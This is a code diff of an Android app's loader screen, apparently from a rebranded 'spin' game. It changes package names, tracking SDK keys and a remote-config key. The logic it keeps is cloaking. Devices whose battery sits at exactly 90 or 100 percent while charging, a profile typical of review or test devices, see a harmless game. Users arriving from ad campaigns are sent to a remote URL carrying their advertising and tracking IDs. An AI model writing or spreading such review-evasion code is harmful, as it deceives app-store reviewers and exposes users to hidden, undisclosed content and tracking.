@@ -1,4 +1,4 @@
-package com.spinner.spinthis;
+package com.spiner.spinthis;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
@@ -10,7 +10,6 @@ import android.content.SharedPreferences;
 import android.net.ConnectivityManager;
 import android.os.BatteryManager;
 import android.os.Bundle;
-import android.telephony.TelephonyManager;
 import android.widget.ImageView;
 
 import com.appsflyer.AppsFlyerConversionListener;
@@ -25,16 +24,13 @@ import com.onesignal.OneSignal;
 
 import org.json.JSONObject;
 
-import java.util.Arrays;
-import java.util.HashSet;
 import java.util.Map;
-import java.util.Set;
 
 public class LoaderActivity extends AppCompatActivity implements SaveInterface{
 
     ImageView gif;
 
-    private static final String ONE_SIGNAL = "794c055b-689b-4acb-9b87-6517b8b6d299";
+    private static final String ONE_SIGNAL = "88cb378c-d185-4bf9-b687-cb3520bbdaaf";
     SharedPreferences sharedPreferences;
 
     @Override
@@ -62,7 +58,7 @@ public class LoaderActivity extends AppCompatActivity implements SaveInterface{
             if (((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() == null) {
                 startGame();
             } else {
-                AppsFlyerLib.getInstance().init("ynBT3AHboeHN5bFFgnH5bB", new AppsFlyerConversionListener() {
+                AppsFlyerLib.getInstance().init("iTV7pzHvKAfACb5RavNRSG", new AppsFlyerConversionListener() {
                     @Override
                     public void onConversionDataSuccess(Map<String, Object> conversionData) {
                         if (firstFl(sharedPreferences)) {
@@ -76,33 +72,39 @@ public class LoaderActivity extends AppCompatActivity implements SaveInterface{
                                         @Override
                                         public void onComplete(@NonNull Task<Boolean> task) {
                                             try {
-                                                String ref = firebaseRemoteConfig.getValue("doc").asString();
+                                                String ref = firebaseRemoteConfig.getValue("box_1").asString();
                                                 JSONObject jsonObject = new JSONObject(conversionData);
                                                 if (jsonObject.optString("af_status").equals("Non-organic")) {
                                                     String campaign = jsonObject.optString("campaign");
                                                     String[] splitsCampaign = campaign.split("_");
+                                                    if (campaign.isEmpty() || campaign.equals("null")) { campaign = jsonObject.optString("c"); }
                                                     OneSignal.sendTag("user_id", splitsCampaign[2]);
                                                     String workUrl = ref + "?naming=" + campaign + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=" + jsonObject.optString("ad_id");
                                                     setPoint(workUrl, sharedPreferences);
+                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                     startPlay();
                                                 } else if (jsonObject.optString("af_status").equals("Organic")) {
                                                     BatteryManager bm = (BatteryManager)getSystemService(BATTERY_SERVICE);
                                                     int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                                                     boolean isCharging = isPhonePluggedIn(LoaderActivity.this);
-                                                    if (((batLevel == 100 || batLevel == 90) && isCharging) || isDevMode()) {
+                                                    if (((batLevel == 100 || batLevel == 90) && isCharging) /*|| isDevMode()*/) {
                                                         setPoint("", sharedPreferences);
+                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                         startGame();
                                                     } else {
                                                         String workUrl = ref + "?naming=null&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=null";
                                                         setPoint(workUrl, sharedPreferences);
+                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                         startPlay();
                                                     }
                                                 } else {
                                                     setPoint("", sharedPreferences);
+                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                     startGame();
                                                 }
                                                 setFirstRun(false, sharedPreferences);
                                                 setFirstFl(false, sharedPreferences);
+                                                AppsFlyerLib.getInstance().unregisterConversionListener();
                                             } catch (Exception ex) {
                                             }
                                         }
